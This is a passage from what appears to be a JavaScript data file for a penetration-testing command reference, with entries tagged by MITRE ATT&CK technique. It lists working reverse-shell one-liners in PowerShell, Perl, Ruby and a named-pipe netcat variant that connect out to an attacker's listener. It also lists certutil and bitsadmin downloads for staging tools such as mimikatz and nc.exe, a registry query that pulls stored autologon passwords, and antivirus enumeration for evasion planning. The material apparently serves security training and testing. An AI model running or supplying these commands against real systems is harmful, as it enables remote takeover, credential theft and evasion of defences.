      command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
      description: "PowerShell reverse shell — for Windows targets.",
      flags: {},
      example: "# Set <IP> and <PORT> to attacker's listener",
      category: "Reverse Shell",
      mitre: "T1059.001"
    },
    {
      tool: "perl",
      command: "perl -e 'use Socket;$i=\"<IP>\";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
      description: "Perl reverse shell — available on many legacy systems.",
      flags: {},
      example: "perl -e 'use Socket;$i=\"10.10.14.2\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
      category: "Reverse Shell",
      mitre: "T1059"
    },
    {
      tool: "ruby",
      command: "ruby -rsocket -e'f=TCPSocket.open(\"<IP>\",<PORT>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      description: "Ruby reverse shell.",
      flags: {},
      example: "ruby -rsocket -e'f=TCPSocket.open(\"10.10.14.2\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      category: "Reverse Shell",
      mitre: "T1059"
    },
    {
      tool: "mkfifo",
      command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f",
      description: "Named pipe (mkfifo) reverse shell — works when nc -e is not available.",
      flags: {},
      example: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f",
      category: "Reverse Shell",
      mitre: "T1059.004"
    },
    {
      tool: "shell_upgrade",
      command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
      description: "Upgrade a dumb shell to a partially interactive TTY. Step 1 of full TTY upgrade.",
      flags: {},
      example: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z\n# stty raw -echo; fg\n# export TERM=xterm\n# Full interactive shell with tab-completion and arrow keys!",
      category: "Shell Upgrade",
      mitre: "T1059"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // FILE TRANSFER TECHNIQUES
  // ═══════════════════════════════════════════════════════════════════════════
  file_transfer: [
    {
      tool: "python",
      command: "python3 -m http.server 8000",
      description: "Start a simple HTTP server for file transfer. Serves files from the current directory.",
      flags: {},
      example: "# Attacker:\npython3 -m http.server 8000\n# Target:\nwget http://10.10.14.2:8000/linpeas.sh\n# or: curl http://10.10.14.2:8000/linpeas.sh -o linpeas.sh",
      category: "File Transfer",
      mitre: "T1105"
    },
    {
      tool: "certutil",
      command: "certutil -urlcache -split -f http://<attacker_ip>/file.exe C:\\Windows\\Temp\\file.exe",
      description: "Windows file download using certutil — a built-in utility often not blocked.",
      flags: { "-urlcache": "URL cache mode", "-split": "Split output", "-f": "Force overwrite" },
      example: "certutil -urlcache -split -f http://10.10.14.2:8000/nc.exe C:\\Windows\\Temp\\nc.exe",
      category: "File Transfer",
      mitre: "T1105"
    },
    {
      tool: "scp",
      command: "scp file.txt user@target:/tmp/file.txt",
      description: "Secure copy over SSH. Transfer files to/from target.",
      flags: { "-r": "Recursive (directories)", "-P": "Port", "-i": "Identity file (SSH key)" },
      example: "scp -i id_rsa linpeas.sh admin@10.10.10.5:/tmp/\nscp admin@10.10.10.5:/etc/shadow ./shadow",
      category: "File Transfer",
      mitre: "T1105"
    },
    {
      tool: "nc",
      command: "nc -lvnp 4444 > received_file  # receiver\nnc <target_ip> 4444 < file_to_send  # sender",
      description: "Transfer files via netcat. No encryption but works when nothing else is available.",
      flags: {},
      example: "# Receiver:\nnc -lvnp 4444 > loot.zip\n# Sender:\nnc 10.10.14.2 4444 < /tmp/loot.zip",
      category: "File Transfer",
      mitre: "T1105"
    },
    {
      tool: "base64",
      command: "base64 -w0 file.bin | xclip -selection clipboard",
      description: "Base64 encode a file for copy-paste transfer through limited shells.",
      flags: {},
      example: "# On source:\nbase64 -w0 mimikatz.exe\n# Copy output\n# On target:\necho '<base64_string>' | base64 -d > mimikatz.exe",
      category: "File Transfer",
      mitre: "T1132"
    },
    {
      tool: "bitsadmin",
      command: "bitsadmin /transfer job /download /priority high http://<attacker_ip>/file.exe C:\\Windows\\Temp\\file.exe",
      description: "Windows file download using BITS (Background Intelligent Transfer Service).",
      flags: {},
      example: "bitsadmin /transfer myJob /download /priority high http://10.10.14.2:8000/shell.exe C:\\Windows\\Temp\\shell.exe",
      category: "File Transfer",
      mitre: "T1105"
    },
  ],

  // ═══════════════════════════════════════════════════════════════════════════
  // WINDOWS POST-EXPLOITATION COMMANDS
  // ═══════════════════════════════════════════════════════════════════════════
  windows_post: [
    {
      tool: "windows",
      command: "systeminfo",
      description: "Display detailed system information including OS version, hotfixes, domain, and architecture.",
      flags: {},
      example: "systeminfo\nOS Name:           Microsoft Windows Server 2019 Standard\nOS Version:        10.0.17763 N/A Build 17763\nHotfix(s):         3 Hotfix(s) Installed\n                   [01]: KB5005568\nDomain:            corp.local",
      category: "Enumeration",
      mitre: "T1082"
    },
    {
      tool: "windows",
      command: "net user /domain",
      description: "List all domain user accounts.",
      flags: {},
      example: "net user /domain\nUser accounts for \\\\DC01\n-----------------------------------------------\nAdministrator            Guest                    krbtgt\nadmin                    svc_sql                  svc_backup",
      category: "Enumeration",
      mitre: "T1087.002"
    },
    {
      tool: "windows",
      command: "net group \"Domain Admins\" /domain",
      description: "List members of the Domain Admins group.",
      flags: {},
      example: "net group \"Domain Admins\" /domain\nGroup name     Domain Admins\nMembers\n-----------------------------------------------\nAdministrator            admin                    svc_sql",
      category: "Enumeration",
      mitre: "T1069.002"
    },
    {
      tool: "windows",
      command: "net localgroup Administrators",
      description: "List members of the local Administrators group.",
      flags: {},
      example: "net localgroup Administrators\nAlias name     Administrators\nMembers\n-----------------------------------------------\nAdministrator\nCORP\\Domain Admins\nCORP\\IT-Admins",
      category: "Enumeration",
      mitre: "T1069.001"
    },
    {
      tool: "windows",
      command: "wmic qfe list brief",
      description: "List installed Windows hotfixes/patches. Find missing patches for kernel exploits.",
      flags: {},
      example: "wmic qfe list brief\nDescription  HotFixID   InstalledOn\nUpdate       KB5005568  9/1/2024\nSecurity     KB5005565  8/15/2024",
      category: "Enumeration",
      mitre: "T1082"
    },
    {
      tool: "windows",
      command: "wmic service list brief | findstr /i \"auto\"",
      description: "List Windows services set to auto-start. Check for services with weak permissions.",
      flags: {},
      example: "wmic service list brief | findstr /i \"auto\"\nCustomSvc  Auto  Running  C:\\Custom\\service.exe\n# Check permissions: icacls C:\\Custom\\service.exe",
      category: "Enumeration",
      mitre: "T1007"
    },
    {
      tool: "windows",
      command: "wmic process list brief",
      description: "List running processes with PID, name, and priority.",
      flags: {},
      example: "wmic process list brief\nHandleCount  Name              ProcessId\n0            System Idle Process  0\n1500         svchost.exe          1234\n300          powershell.exe       4100",
      category: "Enumeration",
      mitre: "T1057"
    },
    {
      tool: "windows",
      command: "netstat -ano",
      description: "Display active network connections with process IDs.",
      flags: { "-a": "All connections", "-n": "Numeric addresses", "-o": "Show owning PID" },
      example: "netstat -ano\n  Proto  Local Address      Foreign Address    State         PID\n  TCP    0.0.0.0:80         0.0.0.0:0          LISTENING     4\n  TCP    10.10.10.5:49753   10.10.14.2:4444    ESTABLISHED   4100  <-- suspicious!",
      category: "Enumeration",
      mitre: "T1049"
    },
    {
      tool: "windows",
      command: "icacls \"C:\\Program Files\\CustomApp\"",
      description: "Check file/directory permissions. Look for BUILTIN\\Users with (F)ull or (M)odify access.",
      flags: {},
      example: "icacls \"C:\\Program Files\\CustomApp\"\nC:\\Program Files\\CustomApp BUILTIN\\Users:(OI)(CI)(M)  <-- users can modify!\n                          NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                          BUILTIN\\Administrators:(OI)(CI)(F)",
      category: "Privilege Escalation",
      mitre: "T1222.001"
    },
    {
      tool: "windows",
      command: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
      description: "Check for autologon credentials stored in the registry.",
      flags: {},
      example: "DefaultUserName    REG_SZ    admin\nDefaultPassword    REG_SZ    AutoLogonPass123!",
      category: "Credential Access",
      mitre: "T1552.002"
    },
    {
      tool: "windows",
      command: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname, pathToSignedProductExe",
      description: "Identify installed antivirus products. Essential for evasion planning.",
      flags: {},
      example: "displayName                pathToSignedProductExe\nWindows Defender           windowsdefender://\nCrowdStrike Falcon         C:\\Program Files\\CrowdStrike\\CSFalconService.exe",
      category: "Defense Evasion",
      mitre: "T1518.001"
    },
    {
      tool: "windows",
      command: "sc qc <service_name>",
      description: "Query service configuration. Check binary path for unquoted service paths and service account.",
      flags: {},
      example: "sc qc CustomSvc\nSERVICE_NAME: CustomSvc\n        BINARY_PATH_NAME   : C:\\Program Files\\Custom App\\service.exe  <-- unquoted with spaces!\n        SERVICE_START_NAME : LocalSystem",
      category: "Privilege Escalation",
      mitre: "T1574.009"
    },
    {
      tool: "windows",
      command: "nltest /dclist:corp.local",
      description: "List domain controllers in the domain. Identify targets for DCSync or other DC-targeted attacks.",
      flags: {},
      example: "nltest /dclist:corp.local\nGet list of DCs in domain 'corp.local'\n    DC01.corp.local [PDC]  [DS] Site: Default-First-Site-Name\n    DC02.corp.local        [DS] Site: Default-First-Site-Name",
      category: "Enumeration",
      mitre: "T1018"
    },
  ],
};
